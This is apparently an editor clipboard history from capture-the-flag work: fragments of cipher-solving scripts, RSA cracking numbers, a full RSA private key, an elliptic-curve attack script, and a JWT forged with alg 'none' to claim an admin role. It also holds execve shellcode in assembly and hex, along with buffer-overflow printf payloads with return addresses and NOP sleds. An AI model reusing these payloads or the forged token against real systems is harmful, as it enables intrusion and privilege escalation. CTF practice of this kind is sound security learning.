74133fb4381523e98fe4e94b936abde8|file:///home/neo/cscc/jaskier/solve.py|41|1|V|python
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
b896a683afe755b98227e2467116151e|file:///home/neo/cscc/jaskier/solve.py|1|1|V|python
	import sys
	import base64
	
	TABLE_DIM = 4
	BLOCK_SIZE = 2
	
	def cnt(pt, size, idx):
	    a,b = 0,0
	    pt = pt >> idx * size
	    print("Pt: ", pt)
	    for _ in range(size):
	        if pt % 2 == 0: a+=1 
	        else: b += 1 
	        pt = pt >> 1
	    return a,b
	
	def blockify(inpt, size, pad):
	    return [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]
	
	def hmask(size, idx):
	    return 2**size-1 << idx*size
	
	def h_rotl(pt, rot, size, idx):
	    """
	    Horizontal left rotation. 
	    """
	    m = hmask(size, idx)
	    blk = pt & m 
	    rot = rot % size
	    r = ((blk << rot) | (blk >> (size - rot)))  & m
	    return pt ^ blk | r
	
	def decrypt(ct):
	    """
	    Decrypt function
	    Global Vars:
	    ------------
	    BLOCK_SIZE = 2
	    TABLE_DIM = 4
	    """
	    dec = [] 
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    for blk in blocks:
	        print("Block:", blk)
	        blk_int = int.from_bytes(blk, byteorder='big')
	        print("Block int:", blk_int)
	        for n in range(TABLE_DIM, -1, -1):
	            print("N:", n)
	            a,b = cnt(blk_int, TABLE_DIM, n)
	            print("a,b: ", a, b)
	            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
	            print("Blk int:", blk_int)
	        dec.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
	    return b''.join(dec).strip(b'\x00')
	
	
	def encrypt(ct):
	    enc = [] 
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    for blk in blocks:
	        blk_int = int.from_bytes(blk, byteorder='big')
	        for n in range(TABLE_DIM, -1, -1):
	            a,b = cnt(blk_int, TABLE_DIM, n)
	            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
	        enc.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
	    return b''.join(enc).strip(b'\x00')
	
	input = str(sys.argv[1])
	b64dec = base64.b64decode(input)
	# b64dec = b'| cat flag.txt'
	# print(b64dec)
	print(decrypt(b64dec).decode('utf-8'))
552f431bf87db2f41bffb7cc8e4c70ad|file:///home/neo/cscc/jaskier/solve.py|69|1|V|python
	b64dec = base64.b64decode(input)
65c68fcb771c43e795cc091ed65bb943|file:///home/neo/cscc/jaskier/solve.py|70|10|v|python
	base64.b64decode(
a08a8ef0705b5d3fb22d86d8b1432053|file:///home/neo/cscc/jaskier/solve.py|70|1|V|python
	b64dec = bytearray(input)
d6229c3863f51d610f26f479c9baffc3|file:///home/neo/cscc/rivia-scala/RsaCtfTool/sodden/create_keys.sh|4|32|v|sh
	10081775934069376322466699804553264161390698995291479128224337251226459352403054698021943523209016869836581762294426305759585426183252867207839313076455760545775530587620343505811664022452788683746349728524611036251650142387121836580387065948298118146524213120751616027881734736577156917565937290577042266603410296055509665510333706127396342361602081982481673359006449668939054042029934744683392030897668248391296982134066909361796073964875798853955778789726179294348657826860382678543528266250028423475084615200338761642140948097950643165477333642714407438035418134626478722768247400534726059383322584034156071599853
b5947e04a8b0f2690f0bcff7841f322a|file:///home/neo/cscc/rivia-scala/RsaCtfTool/sodden/create_keys.sh|2|1|V|sh
	keys=()
87cfc4c4811ab5be41a050a1c6f0184b|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|1|V|sh
	echo $keys
de29516b83ecd06c497404b2b29e3509|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|11|v|sh
	 ..21}
9e376088b19d63e27ae22030f9411b52|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|5|v|sh
	key in $keys do
2600a23ef2d445bd3c6c6d04d0544004|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|4|10|v|sh
	key"
d496669a181beb1008606e19bb5fbfdf|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|2|8|v|sh
	cat ../sodden/keys.txt
14f802e1fba977727845e8872c1743a7|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|2|18|v|sh
	keys
50b61a818a3b396cd73a48e5caf1941f|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|2|1|V|sh
	keys=$(<./sodden/all.txt)
420276edeba72e4ccd0c5d3a9cbd96f5|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|19|v|sh
	/path/to/filename
ad804105a37b4daeca5ac0290508a41b|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|4|1|V|sh
	readarray -t keys ./sodden/all.txt
980da98409d058c365664ff7ea33dd6b|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|28|v|sh
	lines
c5068b7c2b1707f8939b283a2758a691|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|3|35|v|sh
	/etc/passwd
85b338b048effa48a87faa6940593e55|file:///home/neo/cscc/rivia-scala/RsaCtfTool/create_keys.sh|7|57|v|sh
	 >> sodden/key18.pub
957b44567371b674917b65945c28c7ab|file:///home/neo/.bashrc|154|1|V|sh
	export PATH="$HOME/ctf-tools/bin:$PATH"
b1d4abc68be2748c0e2ffe84dd6c0ba6|file:///home/neo/.zshrc|129|1|V|zsh
	export PATH=/home/neo/ctf-tools/bin:$PATH
b517164cb8e16c50d79678d5703ecd08|file:///home/neo/cscc/rivia-scala/cipher.txt|2|1|V|text
	54b45997dcc5a6ef822d88c996d0225ed3e0dfc103bdb91e96a25e414d3e2ba0a31d99ee48876bfdcd733947ae51a5200ff833a683e42035338d3846d0d8dd5309c4672cc77a9208f4417f3e3cd738c9c4fd0e65b1889386a5d696cc4a4cf6a84326633d48d6b99ba3831ba18f59be78acdc3817e4649d172df4b001bc02b356
799737d5992a44c9b8f215d2d9643a0f|file:///tmp/neomutt-neo-1000-2782-12602237482798129434|5|21|v|mail
	but 
dd454329277e31dfb7a29b5c5f200fff|file:///tmp/neomutt-neo-1000-2782-12602237482798129434|5|21|v|mail
	unfortunately 
e289912331165f9c5feadccba5e774a8|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|13|5|v|python
	176773485669509339371361332756951225661L
2b28a8b2f782dffd97d6bc52f6967e29|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|14|4|v|python
	 333197218785800427026869958933009188427L
1d03dd0132e86b3d318d0f4c9c08acc9|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|8|5|v|python
	58900433780152059829684181006276669633073820320761216330291745734792546625247
9e9d20d09e98d4e006e03344a1c6c147|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|9|5|v|python
	56191946659070299323432594589209132754159316947267240359739328886944131258862
74936443615437af9751bd994deed0d4|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|9|5|v|python
	b2df75bab89c7c982d0f5ea8a7cbc7aa601d08a864907cb16344b2a2fe3ba2eee944c2cdac7c788071cbbd21fc7924b472a2a1d10144cb49131a9fbf4304307741ee88d91d7bf00503dcae97a2a342f4bec216b62dd340a876d2e630ca22bbc0727b711d10c9cc7aa7fc6fdbab041cc026a954b8e25745c9218707516b4f0548
740c6cf4625c1a9020989e75163a2c0f|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|10|5|v|python
	65537L
576463e02a410a52c1f0f4b373e8de4f|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|21|11|v|python
	pt  
0e061642be3dfc11f7ab3e602a616c77|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|13|5|v|python
	12226571580407151523926535654202327573133090215360287197617380583119325117965913083300387430080824145266313801077997908107836230625664979697341720498438161
7f15794a36c2fd83a5f940cf4d158932|file:///home/neo/cscc/rivia-scala/RsaCtfTool/crack.py|14|5|v|python
	12819377845872787893236203998845763971359596020385438780666074008262006784691882378804485427182995122461611922518784211933209956012220476177158758536807939
8a6fdc8a586c3330343296387d905f0c|file:///home/neo/cscc/rivia-scala/RsaCtfTool/sodden/privates.txt|1|1|V|text
	-----BEGIN RSA PRIVATE KEY-----
	MIIEpQIBAAKCAQEAs60R+TNl662/CMibdsgcIVgFPlZYC4GW3mI4oRMmu8n70Yll
	nu3DyvXe2f2KlUg9k9ynRfxoD5GtSLceSSKzb31+S8cSy/r4/Ub4Z8KFPh75+AA9
	tlwMC5MVPP28CPK7YWXpY7JO2EMCnJOxkOTk8UPT/MDEKpZVvyeWbNfya3kb1XN7
	mwgRd6QWNVsGKPm+NP1rZjuAlwjZCX7m7NNpRjPiKjHwp+mhvdux13ldAc9LNBVv
	0vXX4Ot9ye6wvY5PhDdUgp/hR+fRJ5gEzgOe+Dy1nNH4cFrHIi0BInkNTgDLGS4U
	e/xJGv2Omc/o7yV5h+Ikbu9glocOWtmnPgFZFQIDAQABAoIBAQCe4j+PjzzkcMsK
	WGLpYcFGVxCj9DR9UEX6Nv7+qPHKg61TuF0NchF+S3eaatL+eVhChY/BmpbmlZqX
	P57fa3ki8OUa21oq2K8PQY/uKRwsN7Yx8PyhYrogDhtsyK9bdlHuqfD9gTKpmHAZ
	x5zwlQhCtQkja87MHg6LL9WcQEWVdI0Dt979INL4OZl03M3Nf489Hi2ivxug2Okl
	B4UMVkPKSPZAjJLkS+i1tveIq4AyUYI7rUAcPjcvR9feVGANbJUy6k3soxR58uyt
	KwyCDupsPGxgNbxTagB732Iik7RFrClTNhIjvuFpLw9UbI0KWfADwcdat7zvUxVX
	Wd1Q6aRNAoGBALRqb6AojH9zPvZVr9na4xqpH0WmSqJfHADmkPj8QqEGfYA7biIi
	5iSpE/P7o3d5v/m3kW38L7MPzUwzsf/JE0Lw6YSOn3urnpAq9Mnjlai9/VRkeYyq
	yd7WYTwrp/oeS1qH+evgjuH9mjCcu1KVHM00wmRZGGqrC9d92VMXFfa3AoGBAP7z
	TOQUKMwWdaWaa7buAAlMK/ywzJzuDRLO6ZdcHk0QR5+WjhySGmosDEfOWWFbDFEE
	b6KcidBZn5va1nnYQVi98VAwkXDbZBYtfZURxfDFeru5j9foipYrOQz9VCA1BVvc
	gCLJLZEP16gYwpyw6RL1lAdBfePn0JchEVLmAsKTAoGBAIJFoJiK7vhQZRRGRxYN
	wZLMr7IBIz8fYf8cfW3r6MiRASoIv7uSa4/pLmksOJrapM5RyIccY+zt6hWt9kd2
	D5x0jImU2n/YKkR7YAovdS9FEJlRe5sg72cicU+bTk2CdnLGYKX7nfB8yEt1wKUe
	2o8qG3uOAd1z6LcPPk+LCeb9AoGBANsBUzbFnnoafPtB2G+uqPdTqKGLmmjgEPjs
	JzrvVdQrPOt5ICCo3OoBZpc0ShFYbg8WeXM9dyE0K+htJzpJq3C40Zdp8TX6MFLg
	xvUL7HY0nYavE0KMLqhq/roKz35PLYhItQWsvWjULBPpGRwS2FSCAqPs/WCOXN/F
	9yS4EvzjAoGAfw+2H4lts+ljdvQCsLhW6MSuo8uMpQiLOL0o4KWKbjhPyZRuu+Aj
	gJQ6MoWCUuhys9TjxTM0+zMVhI5wvyDBTfISeafsEtXNkeP8FHjz9ThP8mjyKklO
	OTABAey+PDsYzJnhvqZ4KQK7OYZ+b/LYY9BaRmJSWsG9LX94NKKgAmo=
	-----END RSA PRIVATE KEY-----
c9e947aeae15e6263b32738d98db1dde|file:///home/neo/cscc/echoes/sourcery.py|10|13|v|python
	/home/tissaia/Desktop/
f528764d624db129b32c21fbca0cb8d6|file:///home/neo/cscc/echoes/sourcery.py|6|10|v|python
	127.0.0.1
4d168f52bd066a42a6403d559d4b9e51|untitled:1|1|1|V|
	ccsc{Hidd3n_In_the_D3pth5}
4d0f951ec30c6cf3940414150f512850|file:///home/neo/ccsc/stiga/dec.py|14|1|V|python
	print("Check the code...")
4597623aa104df5f471f60a5289be391|file:///home/neo/ccsc/jaskier/solve.py|62|33|v|python
	, -1, -1
a5aa0bc400b8123427067286b0fe1563|file:///home/neo/ccsc/jaskier/solve.py|64|13|V|python
	            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
6a90b307d4b51f1d4e9c2544db3dc01a|file:///home/neo/ccsc/jaskier/solve.py|73|15|v|python
	b64dec
53c82eba31f6d416f331de9162ebe997|file:///home/neo/ccsc/jaskier/solve.py|73|7|v|python
	encrypt
a43c1b0aa53a0c908810c06ab1ff3967|file:///home/neo/ccsc/jaskier/solve.py|73|15|v|python
	input
3a25757cdf5eaf42e73e1232e391996f|file:///home/neo/ccsc/mousesack/sage.txt|1|1|V|text
	p = 241089471078013
	A = 0
	B = 7
	xP = 57718729795076
	yP = 22478316955113
	xQ = 37503023403318
	yQ = 141576497851358
	
	E = EllipticCurve(GF(p), [0, 0, 0, A, B])
	assert E.order() == p
	
	Qp = Qp(p, 2)
	Ep = EllipticCurve(Qp, [0, 0, 0, A, B])
	
	yPp = sqrt(Qp(xP) ** 3 + Qp(A) * Qp(xP) + Qp(B))
	Pp = Ep(Qp(xP), (-yPp, yPp)[yPp[0] == yP])
	
	yQp = sqrt(Qp(xQ) ** 3 + Qp(A) * Qp(xQ) + Qp(B))
	Qp = Ep(Qp(xQ), (-yQp, yQp)[yQp[0] == yQ])
	
	print('Pp = {}'.format(Pp))
	print('Qp = {}'.format(Qp))
	print('-' * 40)
	
	lQ = Ep.formal_group().log()(- (p * Qp)[0] // (p * Qp)[1]) / p
	print('log(Q) = {}'.format(lQ))
	lP = Ep.formal_group().log()(- (p * Pp)[0] // (p * Pp)[1]) / p
	print('log(P) = {}'.format(lP))
	print('-' * 40)
	
	e = lQ / lP
	print('e = {}'.format(e))
	
	assert e[0] * E(xP, yP) == E(xQ, yQ)
	
	print('\n--> FLAG: {:d}\n'.format(e[0]))
f8c1bd99a57afac234e8c6e9e1a7c8e4|file:///home/neo/ccsc/mousesack/sage.txt|1|1|V|text
	p = 241089471078013
	A = 0
	B = 7
	xP = 57718729795076
	yP = 22478316955113
	xQ = 37503023403318
	yQ = 141576497851358
b3606a18952c251117ad196fc007a33d|file:///home/neo/ccsc/spell/output/chall/chall.c|32|5|V|c
	    *(__size32*)(ebp - 24) = 5;
abb32e2aa0e3b10b3682b19302041b37|file:///home/neo/ccsc/spell/output/chall/chall.c|25|5|V|c
	    *(__size32*)(ebp - 44) = ebx + 642;
125aaf87c0630202e3a4a2a556d75e72|file:///home/neo/ccsc/spell/output/chall/chall.c|26|5|v|c
	*(__size32*)(ebp - 40) 
a3823aadbd059a5e6b6422a89cb30261|file:///home/neo/ccsc/spell/output/chall/chall.c|27|5|v|c
	*(__size32*
ac25338159fe0494853bf91add09d648|file:///home/neo/ccsc/guydebois/createrop/rop.c|5|35|v|c
	/test/file
c39e264d6d195b59c1b5dfaf6384d571|file:///home/neo/ccsc/guydebois/createrop/rop.asm|2|1|v|asm
	 * 	
8490c729f825b32cb068c6165ceea081|file:///home/neo/ccsc/guydebois/createrop/rop.asm|5|1|v|asm
	 * 	mov    	%es
b030e0559530731f407ac4c42a86fd6a|file:///home/neo/ccsc/guydebois/createrop/rop.asm|1|1|V|asm
	xor    	%eax,%eax
	push   	%eax		# push \0
	push   	$0x7461632f	# /cat
	push   	$0x6e69622f	# /bin
	mov    	%esp,%ebx
	xor	    %ecx,%ecx
	xor 	%edx,%edx
	mov    	$0xb,%al
	int    	$0x80
b585088fcbd380ebc0fe35bfff424c27|file:///home/neo/ccsc/jaskier/solve.py|73|1|V|python
	decrypted = decrypt(b64dec).decode('utf-8')
63b6556896dabcc08221886b30421f17|file:///home/neo/ccsc/jaskier/solve.py|75|1|v|python
	decrypted
79d5cfc3a36fe36a57ef91e03b20529e|file:///home/neo/ccsc/jaskier/solve.py|75|1|V|python
	print(decrypt(decrypted).decode('utf-8'))
3dbaad667940a3eeb773e88e255fae41|file:///home/neo/ccsc/jaskier/solve.py|73|21|v|python
	'aaaa
5a23edbcf112dcf905492ca08c97c4ae|untitled:1|1|1|V|
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00bbb\x67\x06\x40\x00\x00"`
547696be84baae809dc2d48b8c20f01d|untitled:1|1|1|V|
	aaaa\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x67\x06\x40\x00\x0
b6c27747e3f74d356cfdd31f1c60b35e|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	`printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\xff\xff\xff\xff\x7f"`
5f33fd77cbb5fdd1af1924764b0adb3b|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\xff\xff\xff\xff\x7f"`
d95dbfee231e34cccb8c04444412ed7d|file:///home/neo/ccsc/guydebois/shellcode.txt|3|26|v|text
	aaaaaaaaaaaaaaaaaaaaaaa
169c3f081d0a1c4da228087af566b644|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|v|text
	`printf "\x00\x00\x00\x00
3a4c09f92ed18d0141e7b02a6029d67e|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	`printf "\x00\x00\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x6b\xdc\xff\xff\x7f"`
7715ef9549d3ce2ffd24e0a05e30618b|file:///home/neo/ccsc/guydebois/shellcode.txt|6|26|v|text
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\
da526a27158ae7f22cb22adceff78acd|file:///home/neo/ccsc/guydebois/shellcode.txt|6|26|v|text
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
4ff58a2486702f6f3619b3b522e09416|file:///home/neo/ccsc/guydebois/shellcode.txt|6|26|v|text
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x8
401846021e1dd3a3f979df1a5e3c4e72|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x6b\xdc\xff\xff\x7f"`
879e8b141c27945ecbc04ee9ea0a0bb8|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	`printf "\x00\x00\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaab\x6b\xdc\xff\xff\x7f"`
9ab00f722749608ff3f4937f275bb780|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaab\x6b\xdc\xff\xff\x7f"`
34a1a0dbc9b10b520243ee2a143f615c|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	`printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaab\x6b\xdc\xff\xff\x7f"`
a100d4cea5d6f636cbef85d007990e5d|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	p
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaab\x6b\xdc\xff\xff\x7f"`
8e59cf4ac92007edefba142dd3c23565|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x6b\xdc\xff\xff\xff\x7f"`
f7133d19de26d056355c7e167e83a3d6|file:///home/neo/ccsc/guydebois/shellcode.txt|1|1|V|text
	aaaa\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x67\x06\x40\x00\x0
	
	`printf "\x00\x00\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x6b\xdc\xff\xff\x7f"`
	
	
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaab\x6b\xdc\xff\xff\x7f"`
	
	`printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaab\x6b\xdc\xff\xff\x7f"`
c5ae4f5106826422dd2549802bf72517|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	`printf "\x00\x00\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x6b\xdc\xff\xff\x7f"`
	
	
	`printf "\x00\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaab\x6b\xdc\xff\xff\x7f"`
	
74b87337454200d4d33f80c4663dc5e5|file:///home/neo/ccsc/guydebois/shellcode.txt|1|1|v|text
	aaaa
62c8a8ba3b4f0539a9dc02b3815fd01c|file:///home/neo/ccsc/guydebois/shellcode.txt|1|93|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb\x67\x06\x40\x00\x0
4f4590a2e187f0095b38c0e118d6667f|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	`printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaab\x6b\xdc\xff\xff\x7f"`
3df9c22472105c511bafef9d2f29d7f7|file:///home/neo/ccsc/guydebois/shellcode.txt|3|1|V|text
	r <<< `printf "\x31aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x6b\xdc\xff\xff\xff\x7f"`
1c7c3007dfa4df226fdf7f7bf21fb4c6|file:///home/neo/ccsc/wraith/create.py|7|27|^v|python
	\"role\":\"admin\"}
0fc434d95d1b9d9782c6c2f51f0b0b17|file:///home/neo/ccsc/wraith/create.py|8|1|V|python
	"iss":1583352297
eb86be6fe0588de61c66e415b1e789a6|file:///home/neo/ccsc/wraith/jwt.txt|2|12|v|text
	HS256
e6891c34c808de2b846cb3290338a2a0|file:///home/neo/ccsc/wraith/jwt.txt|8|13|v|text
	demo_account
37d942c69ca3166fcf1cd7eff21f5ece|file:///home/neo/ccsc/wraith/jwt.txt|1|1|V|text
	Headers = {
	  "alg" : "none",
	  "typ" : "JWT"
	}
	
	Payload = {
	  "iss" : 1583400915,
	  "role" : "admin"
	}
	
	Signature = "W5dQX9OlVzxFA2urpkZibDIXsS4nARNxIeRHu_d6WNI"
b7f14b7f79b6575bf99edb13709b2780|file:///home/neo/ccsc/wraith/create.py|7|26|^v|python
	\"iss\":\"1583352297\",\
41f89e1937f435f26aa20536a265ec75|file:///home/neo/ccsc/guydebois/pwn.py|2|11|v|python
	easy-shell.hackover.h4q.it
e48e13207341b6bffb7fb1622282247b|file:///home/neo/ccsc/guydebois/pwn.py|2|27|v|python
	1337
48bb6e862e54f2a795ffc4e541caed4d|file:///home/neo/ccsc/guydebois/getshell.py|2|11|v|python
	easy
0635a64b04fcdc5d0c7a36e5cf6ab5d7|file:///home/neo/ccsc/guydebois/getshell.py|2|11|v|python
	-shell.hackover.h4q.it
c632c11357c1e631e7ee29b65c07a45f|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaaa\x40\x06\x67\x00\x00"`
fe14665ac874238a1c58dd7b67cd5dee|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaaa\x67\x06\x40\x00\x00"`
f240b4a3360f3344728b573d154b8ef4|file:///home/neo/ccsc/guydebois/shellcode.txt|8|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa
433ef2abbddbe22863a9e0aa70066775|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
2b9f0b6c362ec09c226daf8c75f6732e|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
